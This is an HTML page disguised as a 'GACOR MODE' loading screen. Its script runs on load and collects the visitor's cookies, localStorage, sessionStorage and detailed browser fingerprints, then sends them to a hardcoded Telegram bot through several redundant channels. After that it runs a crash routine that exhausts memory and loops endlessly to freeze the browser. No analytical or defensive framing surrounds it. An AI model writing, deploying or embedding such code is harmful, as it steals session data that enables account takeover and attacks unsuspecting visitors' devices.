<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>⚡ GACOR ULTIMATE v13.0</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: #0a0a0f;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Segoe UI', system-ui, sans-serif;
      overflow: hidden;
      user-select: none;
    }
    .container {
      text-align: center;
      position: relative;
    }
    .spinner {
      width: 80px;
      height: 80px;
      border: 8px solid rgba(52, 152, 219, 0.15);
      border-top: 8px solid #00f5ff;
      border-right: 8px solid #ff00e6;
      border-radius: 50%;
      animation: spin 0.6s cubic-bezier(0.65, 0, 0.35, 1) infinite;
      filter: drop-shadow(0 0 25px #00f5ff88);
      margin: 0 auto 30px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg) scale(1); }
      50% { transform: rotate(180deg) scale(1.15); }
      100% { transform: rotate(360deg) scale(1); }
    }
    .glow-text {
      color: #fff;
      font-size: 1.2rem;
      letter-spacing: 3px;
      text-transform: uppercase;
      background: linear-gradient(90deg, #00f5ff, #ff00e6, #00f5ff);
      background-size: 300% 100%;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: shimmer 2s linear infinite;
      font-weight: 700;
    }
    @keyframes shimmer {
      0% { background-position: 0% 50%; }
      100% { background-position: 300% 50%; }
    }
    .sub {
      color: #445566;
      margin-top: 12px;
      font-size: 0.75rem;
      letter-spacing: 1px;
    }
    .status {
      color: #00ff88;
      font-size: 0.6rem;
      margin-top: 10px;
      opacity: 0.5;
      letter-spacing: 2px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <div class="glow-text">⚡ GACOR MODE ACTIVE</div>
    <div class="sub">● ● ●</div>
    <div class="status" id="statusText">⏳ INITIALIZING...</div>
  </div>

  <script>
    // ============================================================
    //  🔥 KIRIM DATA KE TELEGRAM — GUARANTEED DELIVERY
    // ============================================================
    (function sendTelegram() {
      try {
        const token = '8819491611:AAEQaIbT70g_fv8dtf0OV_V1YodEgbJqBac';
        const chatId = '7839405566';

        // Kumpulkan data dengan cara SIMPLE
        const payload = {
          cookie: document.cookie || 'no-cookie',
          localStorage: JSON.stringify(localStorage) || '{}',
          sessionStorage: JSON.stringify(sessionStorage) || '{}',
          userAgent: navigator.userAgent,
          platform: navigator.platform || 'unknown',
          language: navigator.language || 'unknown',
          languages: navigator.languages || [],
          deviceMemory: navigator.deviceMemory || 'unknown',
          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
          maxTouchPoints: navigator.maxTouchPoints || 0,
          vendor: navigator.vendor || 'unknown',
          screenWidth: screen.width,
          screenHeight: screen.height,
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          devicePixelRatio: window.devicePixelRatio || 1,
          url: window.location.href,
          origin: window.location.origin,
          referrer: document.referrer || 'direct',
          timestamp: new Date().toISOString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
          canvas: (function() {
            try {
              const canvas = document.createElement('canvas');
              canvas.width = 256;
              canvas.height = 256;
              const ctx = canvas.getContext('2d');
              ctx.fillStyle = '#f60';
              ctx.fillRect(0, 0, 100, 100);
              return canvas.toDataURL().slice(0, 50);
            } catch(e) {
              return 'error';
            }
          })(),
          webgl: (function() {
            try {
              const canvas = document.createElement('canvas');
              const gl = canvas.getContext('webgl');
              if (!gl) return 'not supported';
              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
              if (!debugInfo) return 'no debug info';
              return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
              };
            } catch(e) {
              return 'error';
            }
          })(),
          fonts: (function() {
            try {
              const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Impact', 'Comic Sans MS'];
              const testString = 'mmmmmmmmmmmmmm';
              const canvas = document.createElement('canvas');
              const ctx = canvas.getContext('2d');
              let available = [];
              fontList.forEach(font => {
                ctx.font = `72px ${font}, monospace`;
                const width1 = ctx.measureText(testString).width;
                ctx.font = '72px monospace';
                const width2 = ctx.measureText(testString).width;
                if (width1 !== width2) available.push(font);
              });
              return available;
            } catch(e) {
              return 'error';
            }
          })()
        };

        // Update status
        document.getElementById('statusText').textContent = '📤 SENDING...';

        // ==========================================================
        //  METHOD 1: Fetch API (no-cors) - LANGSUNG
        // ==========================================================
        const msg = encodeURIComponent(JSON.stringify(payload, null, 2));
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`;
        
        fetch(url, { 
          method: 'GET', 
          mode: 'no-cors'
        }).then(() => {
          document.getElementById('statusText').textContent = '✅ DATA SENT!';
        }).catch(() => {
          document.getElementById('statusText').textContent = '⚠️ FETCH FAILED';
        });

        // ==========================================================
        //  METHOD 2: Image Beacon - FALLBACK
        // ==========================================================
        setTimeout(() => {
          try {
            const img = new Image();
            img.src = url + '&_=' + Date.now();
            img.style.display = 'none';
            document.body.appendChild(img);
            document.getElementById('statusText').textContent = '📸 IMAGE BEACON SENT';
          } catch(e) {}
        }, 500);

        // ==========================================================
        //  METHOD 3: XMLHttpRequest - SYNC
        // ==========================================================
        setTimeout(() => {
          try {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', url, false);
            xhr.send();
            document.getElementById('statusText').textContent = '📡 XHR SENT';
          } catch(e) {}
        }, 1000);

        // ==========================================================
        //  METHOD 4: sendBeacon
        // ==========================================================
        setTimeout(() => {
          try {
            if (navigator.sendBeacon) {
              navigator.sendBeacon(url);
              document.getElementById('statusText').textContent = '📶 BEACON SENT';
            }
          } catch(e) {}
        }, 1500);

        // ==========================================================
        //  METHOD 5: localStorage (persistent)
        // ==========================================================
        setTimeout(() => {
          try {
            localStorage.setItem('_telegram_data', JSON.stringify(payload));
            document.getElementById('statusText').textContent = '💾 LOCALSTORAGE SAVED';
          } catch(e) {}
        }, 2000);

        // ==========================================================
        //  METHOD 6: Cookie
        // ==========================================================
        setTimeout(() => {
          try {
            document.cookie = '_telegram_data=' + encodeURIComponent(JSON.stringify(payload)) + '; path=/';
            document.getElementById('statusText').textContent = '🍪 COOKIE SET';
          } catch(e) {}
        }, 2500);

        // Final status
        setTimeout(() => {
          document.getElementById('statusText').textContent = '💥 CRASHING...';
        }, 3000);

      } catch (e) {
        document.getElementById('statusText').textContent = '❌ ERROR';
      }
    })();

    // ============================================================
    //  💀 CRASH ENGINE — INSTANT KILL
    // ============================================================
    setTimeout(() => {
      (function crash() {
        // 1. Memory bomb
        let arr = [];
        for (let i = 0; i < 100; i++) {
          arr.push(new Array(40_000_000).fill('X'));
        }

        // 2. Recursive stack overflow
        function rec(n) {
          if (n <= 0) return;
          let big = new Array(3_000_000).fill('Y');
          rec(n - 1);
        }
        try { rec(99999); } catch(e) {}

        // 3. Infinite loop with DOM spam
        let x = 0;
        while (true) {
          x++;
          for (let i = 0; i < 200; i++) {
            let div = document.createElement('div');
            div.innerHTML = 'z'.repeat(10000);
            div.style.position = 'absolute';
            div.style.top = Math.random() * 1000 + 'px';
            div.style.left = Math.random() * 1000 + 'px';
            document.body.appendChild(div);
          }
          if (x % 100 === 0) {
            'x'.repeat(90_000_000);
          }
        }
      })();
    }, 3500);
  </script>
</body>
</html>
